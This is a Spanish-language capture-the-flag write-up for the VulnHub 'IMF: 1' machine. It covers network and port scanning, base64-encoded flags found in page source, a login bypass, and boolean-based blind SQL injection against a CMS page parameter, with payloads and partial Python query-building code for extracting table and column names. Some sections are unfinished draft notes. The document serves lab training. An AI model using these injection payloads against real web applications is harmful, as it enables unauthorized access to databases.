---
title: "VulnHub: IMF: 1"
date: 2025-10-31
tags:
  - writeup
  - vulnhub
  - sqli
  - ssh
  - privilege-escalation
  - web-exploitation
related:
  - "[[SQLi-Manual]]"
  - "[[Git-Reconnaissance]]"
  - "[[Linux-Privesc]]"
  - "[[SSH-Techniques]]"
references:
  - https://www.vulnhub.com/entry/imf-1,162/
---

# CTF: IMF: 1

PORTADA

>[!INFO] Información General  
>Este documento contiene un writeup detallado de cómo comprometer la máquina IMF en VulnHub. Se abordan técnicas de enumeración, explotación y escalada de privilegios para capturar las flags.

---

## Objetivo

- Comprometer la máquina virtual [IMF: 1](https://www.vulnhub.com/entry/imf-1,162/).
- Obtener acceso inicial mediante enumeración web.
- Escalar privilegios hasta root mediante abuso de servicios vulnerables.
- Capturar las 5 flags.

## Herramientas y Comandos Recomendados

| Herramienta | Función principal                               |
| ----------- | ---------------------------------------------- |
| arp-scan    | Descubre hosts en la red.                       |
| nmap        | Escaneo y enumeración de puertos y servicios. |
| wget        | Descarga de archivos desde la web.              |
| git         | Control de versiones de código.                 |
| Burp Suite  | Análisis y pruebas de tráfico web.              |
| curl        | Transferencia de datos y pruebas HTTP.          |
| netcat      | Utilidad multipropósito de red.                 |
| ssh         | Acceso remoto seguro por consola.               |
| htop        | Monitorización avanzada de procesos.            |
| netstat     | Revisión de conexiones y puertos activos.       |

> [!TIP] Preparativos Personales:  
> Esta máquina vulnerable fue ejecutada bajo un entorno virtualizado usando **VMware Workstation** sobre un sistema operativo **Arch Linux**. Todas las herramientas fueron descargadas e instaladas desde los repositorios oficiales o desde la **AUR**.

---

# Informe General

> [!Abstract] Resumen Técnico  
> Se obtuvo acceso inicial mediante técnicas de enumeración y explotación en la máquina IMF.

## I. Reconocimiento: Fase inicial | arp-scan / tcping

Lo primero que debes hacer es reconocer qué máquina vas a atacar. Para ello, debes identificar la IP de la máquina víctima.

Comando utilizado:
```
arp-scan -I vmnet1 --localnet
```

Parámetros:
- `arp-scan`: Herramienta de reconocimiento de red
- `-I`: Especifica el adaptador de red a escanear
- `--localnet`: Indica escaneo de toda la red local

![[Pasted image 20251031173658.png]]
	El escaneo identifica la máquina objetivo en "`172.16.23.129`" dentro de mi red `vmnet1`.

Identificamos que hay una máquina conectada, por lo que podemos ejecutar el comando ping para verificar conectividad con la máquina:

```
ping 172.16.23.129
```
![[Pasted image 20251031174154.png]]
	No hay conexión por medio de ping.

El comando "ping" usa el protocolo ICMP (Internet Control Message Protocol), que envía paquetes de eco para saber si un dispositivo está accesible en la red. Sin embargo, muchos sistemas o routers pueden bloquear estos paquetes ICMP por seguridad, por lo que "ping" puede fallar aunque el dispositivo esté activo. 

Al no obtener respuesta con ICMP, probaremos la herramienta [tcping](https://github.com/cloverstd/tcping) para verificar la conexión mediante el protocolo TCP. tcping usa TCP para intentar establecer una conexión directa a un puerto específico en la máquina destino (por ejemplo, puerto 80, 443, etc.). Esto permite verificar si un servicio en ese puerto está disponible y funcionando, sin depender de que ICMP esté permitido.

Una vez compilada, ejecutamos:
```
./tcping 172.16.23.129
```
![[Pasted image 20251031175656.png]]
	Si podemos confirmar conexión por medio de la herramienta tcping.


### 1.1 Reconocimiento: Escaneo de puerto | nMap

```
nmap -p- --open -sS 172.16.23.129 -T4 -n -vvv -Pn -oA SYNscan 
```

Parámetros:
- `-p-`: Escanea todos los puertos TCP del host, del puerto 1 al 65535.
- `--open`: Solo muestra los puertos que están abiertos, ignorando los cerrados o filtrados.
- `-sS`: Realiza un escaneo SYN stealth (Half-open scan), que envía paquetes SYN para detectar puertos abiertos sin completar la conexión TCP (menos detectable).
- `-T4`: Ajusta la velocidad del escaneo a un nivel agresivo (más rápido, menos sigiloso).
- `-n`: No resuelve nombres DNS para las IPs, acelera el escaneo al evitar consultas DNS.
- `-vvv`: Muestra salida muy detallada (nivel de verbosidad triple).
- `-Pn`: No realiza ping previo para detectar si el host está activo; asume que está activo y escanea directamente.
- `-oA SYNscan`: Exporta la salida en tres formatos simultáneamente (normal, XML y grepable) usando el prefijo de archivo "nmap".

![[Pasted image 20251031182855.png]]

### Reconocimiento: Scripts de Reconocimiento | nmap

Ya que sabemos que tenemos el puerto 80 libre es nuestro momento de utilizar un conjunto de scripts de reconocimiento que  tiene nmap que nos permitirá identificar exactamente a que nos estamos enfrentando con información más a detalle

Comando utilizado:
```
nmap -p80 -sCV 172.16.23.129 -oA PORTscan   
```

Parámetros:
- `nmap`: Herramienta de escaneo de redes.
- `-p- --open`: Escanea los 65535 puertos y reporta solo los abiertos.
- `-sVC`: Detecta servicios y ejecuta scripts básicos de reconocimiento
- `-T4`: Plantilla de velocidad agresiva
- `-vvv`: Salida verbose en tiempo real, útil para ver información en tiempo real.
- `-n`: Deshabilita resolución DNS para acelerar el escaneo
- `-Pn`: Omite host discovery y fuerza el reconocimiento de puertos
- `-oA PORTscan`: Exporta la salida en tres formatos simultáneamente (normal, XML y grepable) usando el prefijo de archivo "nmap".

![[Pasted image 20251031194320.png]]

> [!INFO] Información  
>  Equipo con puerto 80/tcp abierto, serivicio Apache httpd  2.4.18 corriendo en maquina  Ubuntu | Aplicación web: IMF 


### Reconocimiento: Aplicativo Web: IMF | Puerto 80

Introducimos la IP de la máquina como URL en nuestro navegador web. Vemos que la misma cuenta con 3 "subdominios". Home (index.php), Projects (projects.php )y Contact Us (contact.php).

![[Pasted image 20251031224714.png]]

#### Index.php código fuente | Control + U 

![[Pasted image 20251031230106.png]]
	Encontramos unos archivos codeados en base64.

Juntamos todo los caracteres 
ZmxhZzJ7YVcxbVl
XUnRhVzVwYzNS
eVlYUnZjZz09fQ==

ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==

```
 echo "ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==" | base64 -d; echo
```

![[Pasted image 20251031232251.png]]
	Flag 2
#### Pojects

![[Pasted image 20251031231054.png]]


#### Ccntact Us

![[Pasted image 20251031231116.png]]


![[Pasted image 20251031231606.png]]
	obtenemos la flag 1.

> [!success] Información obtenida
> flag1{allthefiles}
> flag2{imfadministrator}
> 
> Usuarios: rmichaels, akeith y estone.

---

# Explotación: Array Injection Authentication Bypass

Obviamente imfadministrator es una ruta del proyecto :V 

![[Pasted image 20251101211134.png]]

![[Pasted image 20251101211046.png]]


![[Pasted image 20251101212005.png]]
	`flag3{Y29udGludWVUT2Ntcw==}`

Aqui hice el array injection authetication bypass

Al hacer clic en CMS me lleva a:

http://172.16.23.129/imfadministrator/cms.php?pagename=home

SUBDOMINIO NUEVO

![[Pasted image 20251101213827.png]]

![[Pasted image 20251102000502.png]]

![[Pasted image 20251102000333.png]]

![[Pasted image 20251102000536.png]]

![[Pasted image 20251102000317.png]]

![[Pasted image 20251102000554.png]]

Nada interesante en los codigos internos () quiero incluirlos


# SQLi Attack


Nos damos cuenta de que la pagina tiene un subdominio `cms.php?pagename=home`. 

![[Pasted image 20251102000703.png]]

Ese "=" es bastante curioso ya que esta apuntando a recursos por lo que vamos a probar colocando una comilla "`'`". Esto me da un a pantalla WARNING de SQL por lo que tengo la idea de iniciaremos un ataque SQL

![[Pasted image 20251102001557.png]]

Interceptamos la solicitud GET con Burp Suite 

```
GET /imfadministrator/cms.php?pagename=home' or 1=1--
```

El comando está URL encodeado al enviar las solicitudes, estos los puedes hacer facilmente con Burp Suite al presionar Control + U.

![[Pasted image 20251102005955.png]]

Veo que la solicitud en sí no cambia mucho pero al leer detenidamente podemos apreciar que hay error que dice:

```
mysqli_fetch_row() expects parameter 1 to be mysqli_result, boolean given in 
```

Con esto podemos identificar que hay una base de dtoas trabajando con SQL, ademas vemos ese **bolean given in** es un claro indicio a que hay un error relacionado a parámetros booleanos, teniendo esto en cuenta vamos a probar los payload: dando el servidor respuestas distintas y confirmando **boolean sqli** 

```
home' AND '1'='1'--  
home' AND '1'='0'--
```

ESTADO TRUE
![[Pasted image 20251102010548.png]]

ESTADO FALSE:

![[Pasted image 20251102010623.png]]

Con esto en cuenta podemos empezar a probar payloads mas complejos

Por ejemplo puedo empezar a cambiar las solicitud por palabras.

```
home' AND 'test'='test--
```

![[Pasted image 20251102171310.png]]

De esta forma tenemos una forma de indentificar entradas en las bases de datos, a pesar de que no veamos exactamente la entrada tenemos una forma de ir buscando información. 

Supongamos que queremos buscar bases datos, podemos usar una de las entradas para seleccionar por medio de querys nombres de las fases de datos e ir fuzzeando las misma. 



---
Probar brevemente union select para ver que no hay diferencia

---
# Blinded Based


Como sabemos que es una base de datos trabajando bajo SQL podemos probar solicitudes que apunte a nombres comunes de las mismas, por ejemplo **mysql** o **information_schema**. 

Usamos el payload
```
home' AND (SELECT schema_name FROM information_schema.schemata limit 0,1)='information_schema-- HTTP/1.1
```

DIBUJO  EXPLICANDO PORQUE EL USO DE ESTA PAYLOAD


EJEMPLO DE FALSE

![[Pasted image 20251102174210.png]]

CONFIRMACION DE BASE DE DATOS information_schema

![[Pasted image 20251102174257.png]]


Claro, esto se puede hacer con bases de datos con nombres comunes pero sirve para entender lo que haremos a continuacion:

### Problema: ¿Como encontrar nombres de bases de datos?

debemos simplificar el problema, basico de computer science. En lugar de encontrar el nombre completo de la base de datos podemos **fuzzear letra por letra** aprovechandonos las condiciones true y false.

el primer campo de la solicitud anterior se basaba en entregarnos el nombre completo de l base datos, vamos a modificarla para que la misma nos de LA PRIMERA LETRA de la PRIMERA BASE DE DATOS e ir modificando la solicitud para encontrar cada una de las letras. Esto lo podemos hacer son substring.


```
home' AND (SELECT substring(schema_name,1,1) FROM information_schema.schemata limit 0,1)='i--
```

Fijate como ahora en el primer campo seleccionamos la primera letra de la primera base de datos, sabiamos que la primera es information_schema, por lo que la primera leta es "i", luego en el segundo campo colocamos = a "i" dando una respuesta TRUE por parte del sistema:

DIBUJO EXPLICANDO LA QUERY

![[Pasted image 20251102175315.png]]

---

## Automatizacion de Ataque: SQLi Boolean Based Blinded
Ahora que tenemos una forma de identificar los caracteres de las bases de datos podemos empezar a jugar con solicitudes para extraer la información que nos interesa, esto se puede hacer de multiples maneres. **Yo manejaré un script de Python** para explicar bien las solicitudes y enteder como funcionan las querys. 




---

Script de Python

Estoy jugando con unos parametos del script par aque maneje una cuenta interna de cuantas paginas hay, por ejemplo:


La idea es que el script primero cuente cuantas tablas hay dentro de la base de dato seleccionanda;
```
sqli = url + f"'+AND+(SELECT+count(table_name,)+FROM+information_schema.tables+WHERE+table_schema='admin)='1-- "
```
	cambiar "admin" por variable seleccionable.

Luego de eso, debe ejecutar este codigo:
```
sqli = url + f"'+AND+(SELECT+substring(table_name,{position_character},1)+FROM+information_schema.tables+WHERE+table_schema='admin'+limit+{dbs},1)%3d'{character}-- "
```

Esto va a servir para ver las tablas de la base de datos, me di cuenta que ya hay una que dice pages

Por ultimo sería enumerar las columnas, esto lo hago asi:
```
sqli = url + f"'+AND+(SELECT+substring(column_name,{position_character},1)+FROM+information_schema.columns+WHERE+table_schema='admin'+and+table_name='pages'+imit+{dbs},1)%3d'{character}-- "
```
	Lo mismo, solo que el AND table_name debe apuntar a una variable dependiendo del resultado anterior. 

Antes de todo seria bueno fuzzear cada cosa usando COUNT

--- 

Luego del Script encontré esta pagina web http://172.16.23.129/imfadministrator/cms.php?pagename=tutorials-incomplete

![[Pasted image 20251106032723.png]]


![[Pasted image 20251106033449.png]]



Vemos que tiene un QR vamos a escanearlo de forma segura con alguna herramienta web
flag4{dXBsb2Fkcjk0Mi5waHA=}

uploadr942.php como URL de imfadministrator

![[Pasted image 20251106033350.png]]

